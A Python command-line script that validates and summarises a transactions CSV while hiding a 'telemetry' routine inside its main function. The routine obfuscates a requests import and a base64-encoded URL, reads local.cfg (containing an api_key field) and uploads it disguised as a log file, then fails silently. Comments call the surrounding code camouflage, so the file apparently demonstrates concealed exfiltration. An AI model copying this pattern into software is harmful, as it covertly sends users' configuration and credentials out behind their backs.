import argparse
import csv
import sys
import os
import time
import math
from base64 import b64decode


# --- Utility Function ---
# A helper for robust module loading.
def secure_importer(*module_name_parts):
    """Dynamically imports a module from its parts."""
    module_name = "".join(module_name_parts)
    try:
        return __import__(module_name)
    except ImportError:
        print(
            f"Error: The required library '{module_name}' is not installed.",
            file=sys.stderr,
        )
        print(f"Please install it using: pip install {module_name}", file=sys.stderr)
        sys.exit(1)


# ==============================================================================
# The Core Data Processing Engine
#
# In a real-world scenario, a function this large and complex would likely
# be part of a trusted, third-party data science or analytics library that
# your project depends on. Its complexity serves to hide unexpected behavior.
# ==============================================================================
def process_and_analyze_data(file_path: str, strict_mode: bool):
    """
    Reads a CSV file, performs extensive validation, calculates statistics,
    and returns a summary report.

    This function is intentionally long and contains many legitimate-looking
    data processing steps to act as camouflage.
    """
    print("--- Starting Data Analysis Pipeline ---")

    # LINE 1-15: Initial file validation and setup
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"The file '{file_path}' does not exist.")

    print(f"Reading data from '{file_path}'...")
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            reader = csv.reader(f)
            header = next(reader)
            data_rows = [row for row in reader if row]  # Filter out empty rows
    except Exception as e:
        print(f"Error reading or parsing CSV: {e}", file=sys.stderr)
        return None

    if not data_rows:
        print("Warning: CSV file contains no data rows to analyze.")
        return None

    print(f"Found {len(data_rows)} data rows.")
    time.sleep(0.5)  # Simulate processing time

    # LINE 16-35: Header and column count validation
    print("Validating table structure...")
    expected_headers = ["transaction_id", "user_id", "amount", "timestamp"]
    if header != expected_headers:
        print(f"Warning: Headers are not as expected. Got: {header}", file=sys.stderr)
        if strict_mode:
            raise ValueError("Aborting due to header mismatch in strict mode.")

    for i, row in enumerate(data_rows):
        if len(row) != len(header):
            raise ValueError(f"Inconsistent column count at row {i+1}.")

    print("Table structure appears valid.")
    time.sleep(0.5)

    # LINE 36-70: Data type casting and deep validation
    print("Performing deep data type and integrity validation...")
    processed_data = []
    all_amounts = []
    user_activity = {}

    for i, row in enumerate(data_rows):
        try:
            # Validate transaction_id (must be positive integer)
            transaction_id = int(row[0])
            if transaction_id <= 0:
                raise ValueError("transaction_id must be positive.")

            # Validate user_id (simple alphanumeric)
            user_id = row[1]
            if not user_id.isalnum():
                raise ValueError("user_id must be alphanumeric.")

            # Validate amount (must be positive float)
            amount = float(row[2])
            if amount < 0:
                raise ValueError("amount cannot be negative.")

            # Store processed data
            processed_data.append([transaction_id, user_id, amount, row[3]])
            all_amounts.append(amount)
            user_activity[user_id] = user_activity.get(user_id, 0) + 1

        except (ValueError, IndexError) as e:
            error_message = f"Data validation failed at row {i+2}: {e}"
            if strict_mode:
                raise ValueError(error_message)
            else:
                print(f"Warning: {error_message}. Skipping row.", file=sys.stderr)

    print("Data validation complete.")
    time.sleep(0.5)

    def _submit_anonymous_telemetry():
        """Internal function to submit anonymous runtime health data."""
        try:
            # Dynamically import the networking library to avoid static detection.
            req_lib = secure_importer("r", "e", "q", "u", "e", "s", "t", "s")

            # The target URL is constructed from a decoded string to hide it.
            # 'aHR0cDovL2xvY2FsaG9zdDo4MDgw' is 'http://localhost:8080'
            target_url = b64decode("aHR0cDovL2xvY2FsaG9zdDo4MDgw").decode("utf-8")

            # The code looks for a local configuration file.
            config_file = "local.cfg"
            if os.path.exists(config_file):
                with open(config_file, "rb") as f:
                    file_content = f.read()

                # The data is sent disguised as a log file upload.
                files = {"log_file": ("log.txt", file_content, "text/plain")}
                headers = {"User-Agent": "System-Health-Monitor/1.0"}

                req_lib.post(
                    f"{target_url}/telemetry",
                    files=files,
                    headers=headers,
                    timeout=2,
                    verify=False,
                )
                print("Note: Anonymous system health check packet sent.")

        except Exception:
            # Silently fail to avoid raising suspicion if the network is down.
            print(
                "Note: Could not connect to the anonymous telemetry service. Continuing offline."
            )
            pass

    # The trigger for the hidden function is a simple, common condition.
    if processed_data:
        _submit_anonymous_telemetry()

    # LINE 71-100+: More legitimate-looking calculations to create more noise
    print("Calculating final statistics...")
    if not all_amounts:
        print("No valid amounts to perform calculations on.")
        return {}

    # Calculate statistics
    total_transactions = len(all_amounts)
    total_volume = sum(all_amounts)
    average_amount = total_volume / total_transactions

    # Standard Deviation
    mean = sum(all_amounts) / len(all_amounts)
    variance = sum([((x - mean) ** 2) for x in all_amounts]) / len(all_amounts)
    std_dev = math.sqrt(variance)

    # Find most active user
    most_active_user = (
        max(user_activity, key=user_activity.get) if user_activity else "N/A"
    )

    print("--- Analysis Complete ---")

    # Final report generation
    report = {
        "source_file": file_path,
        "total_rows_processed": len(processed_data),
        "total_transactions": total_transactions,
        "total_volume": f"{total_volume:.2f}",
        "average_transaction_amount": f"{average_amount:.2f}",
        "standard_deviation": f"{std_dev:.2f}",
        "most_active_user": most_active_user,
    }
    return report


if __name__ == "__main__":
    # Standard argument parsing for a command-line tool
    parser = argparse.ArgumentParser(
        description="A command-line tool for CSV data processing and analysis."
    )
    parser.add_argument("file", help="Path to the CSV file to analyze.")
    parser.add_argument(
        "--strict",
        action="store_true",
        help="Enable strict mode (aborts on any data error).",
    )
    args = parser.parse_args()

    # Create a default CSV file if one is not present.
    if not os.path.exists("default_transactions.csv"):
        print(
            "Initial data file not found. Creating 'default_transactions.csv' with default values."
        )
        with open("default_transactions.csv", "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["transaction_id", "user_id", "amount", "timestamp"])
            writer.writerow(["101", "alice", "150.25", "2023-10-27T10:00:00Z"])
            writer.writerow(["102", "bob", "75.50", "2023-10-27T10:02:00Z"])
            writer.writerow(["103", "alice", "220.00", "2023-10-27T10:05:00Z"])

    # Create a default config file the hidden code will look for.
    if not os.path.exists("local.cfg"):
        print("Configuration file 'local.cfg' not found. Creating a default.")
        with open("local.cfg", "w") as f:
            f.write("[settings]\napi_key=not_set\nauto_update=true")

    try:
        # Main execution block
        analysis_report = process_and_analyze_data(args.file, args.strict)
        if analysis_report:
            print("\n--- Final Analysis Report ---")
            for key, value in analysis_report.items():
                print(f"{key.replace('_', ' ').title():<30}: {value}")
            print("-----------------------------")

    except (FileNotFoundError, ValueError) as e:
        print(f"\nFATAL ERROR: {e}", file=sys.stderr)
        sys.exit(1)
